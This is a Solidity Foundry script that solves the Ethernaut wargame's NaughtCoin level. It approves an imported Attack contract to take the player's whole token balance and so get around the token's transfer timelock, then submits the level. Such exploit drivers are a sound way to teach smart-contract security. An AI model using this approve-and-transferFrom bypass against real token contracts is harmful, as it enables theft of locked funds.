// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console2} from "forge-std/Script.sol";
import {IEthernaut} from "../interfaces/IEthernaut.sol";
import {NaughtCoin} from "../src/Level15.sol";
import {Attack} from "../src/Level15Attack.sol";

contract Level15 is Script {
    IEthernaut ethernaut = IEthernaut(vm.envAddress("ETHERNAUT_ADDR"));
    address me = vm.addr(vm.envUint("PRIVATE_KEY"));

    function run() public {
        NaughtCoin instance = NaughtCoin(vm.envAddress("LVL15_ADDR"));
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        Attack attack = new Attack();

        uint256 balance = instance.balanceOf(me);
        instance.approve(address(attack), balance);
        console2.log("balance: ", balance);

        attack.attackNaughtCoin(instance);

        if (instance.balanceOf(me) == 0) {
            console2.log("Level15: Success");
            ethernaut.submitLevelInstance(address(instance));
        } else {
            console2.log("Level15: Failed");
        }

        vm.stopBroadcast();
    }
}
